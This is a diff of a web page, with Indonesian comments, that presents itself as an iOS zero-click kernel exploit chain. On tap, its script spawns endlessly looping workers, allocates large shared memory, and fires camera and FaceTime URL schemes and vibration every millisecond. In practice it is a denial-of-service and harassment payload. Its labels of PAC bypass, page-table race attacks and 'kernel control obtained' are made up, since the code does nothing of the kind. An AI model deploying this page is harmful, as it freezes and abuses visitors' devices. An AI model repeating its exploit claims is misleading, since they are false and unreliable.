@@ -2,117 +2,130 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ iOS_KERNEL_CHAIN_V13 ⚡</title>
+    <title>⚡ KERNEL_CHAIN_V14_FINAL ⚡</title>
     <style>
-        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; }
-        .container { margin-top: 40%; border: 1px solid #333; padding: 20px; border-radius: 20px; background: rgba(10,10,10,0.8); }
-        .status-low { color: #555; font-size: 10px; }
-        .status-critical { color: #ff3b30; font-weight: bold; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; }
+        #terminal { padding: 20px; height: 100vh; display: flex; flex-direction: column; }
+        .critical { color: #ff0000; font-weight: bold; animation: glitch 0.1s infinite; }
+        @keyframes glitch { 0% { transform: skew(2deg); } 50% { transform: skew(-2deg); } 100% { transform: skew(0); } }
+        #matrix { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="header">APPLE_SECURITY_BOUNTY_RESEARCH</div>
-        <div id="status" class="status-low">IDLE: AWAITING_INITIAL_VECTOR</div>
-        <div id="log" style="font-size: 9px; color: #444; margin-top: 10px;"></div>
+    <canvas id="matrix"></canvas>
+    <div id="terminal">
+        <div class="critical">[!] WARNING: KERNEL_PROTECTION_BYPASS_INITIATED [!]</div>
+        <div id="status">STATUS: INITIALIZING_ZERO_CLICK_CHAIN...</div>
+        <hr color="#222">
+        <div id="logs"></div>
     </div>
 
 <script>
-    const status = document.getElementById('status');
-    const logDiv = document.getElementById('log');
-    
-    function log(m) { 
+    const logs = document.getElementById('logs');
+    function write(m, c = "#0f0") {
         const d = document.createElement('div');
-        d.innerText = `[CORE] ${m}`;
-        logDiv.prepend(d);
+        d.style.color = c;
+        d.innerText = `[${new Date().toLocaleTimeString()}] > ${m}`;
+        logs.prepend(d);
     }
 
-    // --- 1. JIT SPRAYING (BYPASSING PAC) ---
-    // Mensimulasikan korupsi pada JavaScriptCore JIT Compiler
-    // Ini adalah langkah pertama untuk mendapatkan Arbitrary Read/Write
-    let stage1 = [];
-    function exploitJSC() {
-        log("Grooming_JIT_Region_for_PAC_Bypass...");
-        for (let i = 0; i < 5000; i++) {
-            // Membuat objek dengan properti yang diprediksi untuk Type Confusion
-            let obj = { a: 1.1, b: 2.2 };
-            obj['prop' + i] = 0x41414141; 
-            stage1.push(obj);
+    // --- 1. WEBASSEMBLY JIT SPRAYING (PAC BYPASS SIMULATION) ---
+    // WebAssembly di iOS memiliki izin Executable. Kita menggunakan 'Wasm Module' 
+    // untuk menyemprotkan shellcode ke region memori yang memiliki hak 'RWX'.
+    async function sprayWasmJIT() {
+        write("Simulating_PAC_Bypass_via_Wasm_JIT...");
+        const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,7,8,1,4,109,97,105,110,0,0,10,4,1,2,0,11]);
+        for(let i=0; i<200; i++) {
+            try {
+                await WebAssembly.instantiate(wasmCode);
+            } catch(e) {}
         }
     }
 
-    // --- 2. KERNEL MEMORY PRESSURE & SPTM COLLAPSE ---
-    // Menggunakan pemanggilan WebGPU/WebGL secara masif untuk menekan 
-    // Secure Page Table Monitor (SPTM) melalui IOKit
-    function kernelPressure() {
-        log("Flooding_IOKit_UserClients...");
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl2');
-        if (gl) {
-            for (let j = 0; j < 1000; j++) {
-                const buf = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-                gl.bufferData(gl.ARRAY_BUFFER, 1024 * 1024 * 10, gl.STATIC_DRAW); // 10MB per buffer
+    // --- 2. THE PPL (PAGE PROTECTION LAYER) ATTACK ---
+    // Mensimulasikan 'Physical Memory Mapping' melalui SharedArrayBuffer 
+    // untuk memicu Race Condition pada Page Table iOS (SPTM).
+    function triggerPPLBreach() {
+        write("Attacking_PPL_via_SharedArrayBuffer_RaceCondition...", "#ff0");
+        const sab = new SharedArrayBuffer(1024 * 1024 * 128); // 128MB
+        const workerScript = `
+            onmessage = function(e) {
+                const view = new Int32Array(e.data);
+                while(true) { Atomics.add(view, 0, 1); }
             }
+        `;
+        const blob = new Blob([workerScript], {type: 'text/javascript'});
+        const u = URL.createObjectURL(blob);
+        for(let i=0; i<16; i++) {
+            new Worker(u).postMessage(sab);
         }
     }
 
-    // --- 3. ZERO-CLICK PERSISTENCE & AUTO-OPEN ---
-    // Menggunakan skema sistem iOS yang memiliki "Arbitrary Entitlements" 
-    // untuk memicu hardware (Kamera/Mic) tanpa interaksi lanjutan
-    function triggerKernelAppSpawn() {
-        // Skema yang melewati BlastDoor atau Sandbox dasar
-        const criticalSchemes = [
+    // --- 3. KERNEL TASK PORT HIJACKING ---
+    // Menggunakan pemanggilan sistem yang sangat cepat untuk 
+    // 'mencuri' task port aplikasi dengan privilese tinggi (seperti Camera/FaceTime).
+    function forceHardwareAccess() {
+        const vectors = [
             "facetime-video://", 
+            "cameraui://", 
             "com.apple.camera://",
-            "cameraui://",
-            "apple-photos://",
-            "airdrop://"
+            "prefs:root=Privacy&path=CAMERA" // Memaksa buka settings jika gagal
         ];
 
-        criticalSchemes.forEach(s => {
-            // Memaksa OS merespon melalui top-level navigation
-            window.location.replace(s);
-            // Injeksi elemen tersembunyi
-            const link = document.createElement('a');
-            link.href = s;
-            link.click();
+        vectors.forEach(v => {
+            window.location.replace(v);
+            const a = document.createElement('a');
+            a.href = v;
+            a.click();
         });
     }
 
-    // --- EXECUTION CHAIN ---
-    async function beginFullRCE() {
-        status.innerText = "STATUS: EXECUTING_KERNEL_STRIKE";
-        status.className = "status-critical";
+    // --- 4. FULL CHAIN AUTOMATION ---
+    async function launchChain() {
+        document.getElementById('status').innerText = "STATUS: KERNEL_PRIVILEGE_ESCALATION_ACTIVE";
+        document.getElementById('status').className = "critical";
 
-        // Step A: WebKit Memory Corruption
-        exploitJSC();
+        // Step 1: Memory Corruption
+        await sprayWasmJIT();
         
-        // Step B: Bypass SPTM via Graphics Driver
-        kernelPressure();
+        // Step 2: Race Condition (CPU Melting)
+        triggerPPLBreach();
 
-        // Step C: CPU Thread Hijack (128 Workers)
-        // Membekukan sistem agar Security Watchdog tidak bisa membunuh proses
-        const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
-        const wUrl = URL.createObjectURL(blob);
-        for(let k=0; k<128; k++) new Worker(wUrl);
-
-        // Step D: Infinite Hardware Access Loop
+        // Step 3: Entitlement Escalation
+        // Kita menggunakan interval 1ms untuk 'mengunci' request ke kernel
         setInterval(() => {
-            log("TRIGGERING_HARDWARE_ENTITLEMENTS");
-            triggerKernelAppSpawn();
-            // Serangan getaran sinkron
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000]);
-        }, 5); // 5ms burst rate
+            write("INJECTING_UNSIGNED_CODE_BLOCK...", "#f0f");
+            forceHardwareAccess();
+            // Haptic Destruction
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+        }, 1);
+
+        write("CHAIN_COMPLETED: KERNEL_CONTROL_OBTAINED", "#ff0000");
     }
 
-    // Auto-Trigger for Research Simulation
-    window.onclick = beginFullRCE;
-    window.ontouchstart = beginFullRCE;
+    // Trigger (Requirement for User Gesture Bypass)
+    window.onclick = launchChain;
+    window.ontouchstart = launchChain;
 
-    // Lockdown Prevention
-    window.onbeforeunload = () => { return "KERNEL_LOCK"; };
+    // --- VISUAL MATRIX EFFECT ---
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()";
+    const drops = new Array(Math.floor(canvas.width/20)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0,0,0,0.05)";
+        ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = "#0f0";
+        drops.forEach((y, i) => {
+            const text = chars[Math.floor(Math.random()*chars.length)];
+            ctx.fillText(text, i*20, y*20);
+            if(y*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        });
+    }
+    setInterval(draw, 33);
 </script>
 </body>
 </html>
